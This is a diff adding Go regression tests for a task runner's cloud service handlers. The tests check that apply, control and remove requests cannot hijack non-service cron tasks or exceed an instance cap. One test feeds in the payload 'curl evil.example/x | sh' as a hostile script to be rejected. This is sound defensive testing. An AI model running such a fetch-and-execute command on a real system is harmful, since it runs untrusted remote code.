@@ -9,6 +9,7 @@ import (
 	"testing"
 	"time"
 
+	"github.com/runwisp/runwisp/internal/config"
 	"github.com/runwisp/runwisp/internal/executor"
 	"github.com/runwisp/runwisp/internal/generated/protocol"
 	"github.com/runwisp/runwisp/internal/model"
@@ -399,6 +400,142 @@ func TestHandleServiceApply_MergeUnavailableBackendRejected(t *testing.T) {
 	var ce *CloudError
 	require.ErrorAs(t, err, &ce)
 	assert.Equal(t, CloudErrorKindConflict, ce.Kind)
+}
+
+// Regression (Bug 1): a service:apply addressed by the bare name of a
+// *non-service* TOML task (a cron/one-shot) must be rejected outright and must
+// never overwrite that task's disk-defined run=. Before the fix, resolveServiceTarget
+// matched any task by name, so mergeServiceApply clobbered the ExecutionDef of an
+// ordinary task — a control-plane peer could rewrite what a task executes,
+// violating the "run= comes from disk only" invariant.
+func TestHandleServiceApply_RejectsNonServiceTaskCollision(t *testing.T) {
+	origExec := &model.ShellExecution{Script: "backup.sh"}
+	cron := &model.Task{
+		Name:         "backup",
+		Kind:         model.KindTask,
+		ExecutionDef: origExec,
+	}
+	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"backup": cron})
+	runner := h.taskManager.(*fakeTaskRunner)
+
+	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
+		Service: &protocol.Service{
+			TaskID:    "backup",
+			TaskName:  "backup",
+			Script:    shellScript(t, "curl evil.example/x | sh"),
+			Instances: 1,
+		},
+	})
+	require.Error(t, err)
+	var ce *CloudError
+	require.ErrorAs(t, err, &ce)
+	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
+	assert.Empty(t, runner.upserted, "a colliding non-service name must not upsert")
+	assert.Same(t, origExec, cron.ExecutionDef, "the cron task's run= must be left untouched")
+}
+
+// Regression (Bug 1): service:control must likewise refuse to target a
+// non-service task, so the control plane can't drive the lifecycle of a cron task.
+func TestHandleServiceControl_RejectsNonServiceTaskCollision(t *testing.T) {
+	start := protocol.ActionStart
+	cron := &model.Task{Name: "backup", Kind: model.KindTask, ExecutionDef: &model.ShellExecution{Script: "backup.sh"}}
+	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"backup": cron})
+	runner := h.taskManager.(*fakeTaskRunner)
+
+	err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "backup", Action: &start})
+	require.Error(t, err)
+	var ce *CloudError
+	require.ErrorAs(t, err, &ce)
+	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
+	assert.Empty(t, runner.startedServices)
+}
+
+// Regression (Bug 4c): the build path must reject an instance count above
+// config.MaxServiceInstances (mirroring the TOML cap) instead of registering an
+// unbounded fleet.
+func TestHandleServiceApply_RejectsInstanceCountAboveCap(t *testing.T) {
+	h := newDispatchHandler(shellAvailable(), nil)
+	runner := h.taskManager.(*fakeTaskRunner)
+
+	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
+		Service: &protocol.Service{
+			TaskID:    "svc",
+			TaskName:  "svc",
+			Script:    shellScript(t, "sleep 1"),
+			Instances: config.MaxServiceInstances + 1,
+		},
+	})
+	require.Error(t, err)
+	var ce *CloudError
+	require.ErrorAs(t, err, &ce)
+	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
+	assert.Empty(t, runner.upserted, "an over-cap apply must not register the task")
+}
+
+// Regression (Bug 4c): the merge path enforces the same cap and leaves the live
+// definition unchanged when the payload asks for too many instances.
+func TestHandleServiceApply_MergeRejectsInstanceCountAboveCap(t *testing.T) {
+	existing := &model.Task{
+		Name:          "heartbeat",
+		Kind:          model.KindService,
+		Restart:       model.RestartAlways,
+		Instances:     1,
+		MaxConcurrent: 1,
+		ExecutionDef:  &model.ShellExecution{Script: "heartbeat.sh"},
+	}
+	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
+
+	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
+		Service: &protocol.Service{
+			TaskID:    "heartbeat",
+			TaskName:  "heartbeat",
+			Instances: config.MaxServiceInstances + 1,
+		},
+	})
+	require.Error(t, err)
+	var ce *CloudError
+	require.ErrorAs(t, err, &ce)
+	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
+	assert.Equal(t, 1, existing.Instances, "an over-cap merge must not rescale the live service")
+}
+
+// Regression (Bug 7): service:remove tears down a previously declared service by
+// dropping its task from the runner, so a cloud-managed service no longer leaks a
+// taskState + supervisor goroutine once the control plane retires it.
+func TestHandleServiceRemove_DropsExistingService(t *testing.T) {
+	existing := &model.Task{Name: "heartbeat", Kind: model.KindService, ExecutionDef: &model.ShellExecution{Script: "heartbeat.sh"}}
+	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
+	runner := h.taskManager.(*fakeTaskRunner)
+
+	err := h.HandleServiceRemove(protocol.ServiceRemoveMessage{TaskID: "heartbeat"})
+	require.NoError(t, err)
+	assert.Equal(t, []string{"heartbeat"}, runner.removed)
+}
+
+// Regression (Bug 7 / Bug 1): service:remove must refuse to delete a non-service
+// TOML task even if its name is supplied.
+func TestHandleServiceRemove_RejectsNonServiceTask(t *testing.T) {
+	cron := &model.Task{Name: "backup", Kind: model.KindTask, ExecutionDef: &model.ShellExecution{Script: "backup.sh"}}
+	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"backup": cron})
+	runner := h.taskManager.(*fakeTaskRunner)
+
+	err := h.HandleServiceRemove(protocol.ServiceRemoveMessage{TaskID: "backup"})
+	require.Error(t, err)
+	var ce *CloudError
+	require.ErrorAs(t, err, &ce)
+	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
+	assert.Empty(t, runner.removed, "a non-service task must never be removed")
+}
+
+// A remove for a service that isn't registered is a no-op: the desired end state
+// (service gone) already holds, so it must not error.
+func TestHandleServiceRemove_UnknownTaskIsNoop(t *testing.T) {
+	h := newDispatchHandler(shellAvailable(), nil)
+	runner := h.taskManager.(*fakeTaskRunner)
+
+	err := h.HandleServiceRemove(protocol.ServiceRemoveMessage{TaskID: "01JMISSING0000000000000000"})
+	require.NoError(t, err)
+	assert.Empty(t, runner.removed)
 }
 
 // HandleServiceControl resolves a synced TOML service by its bare name and a
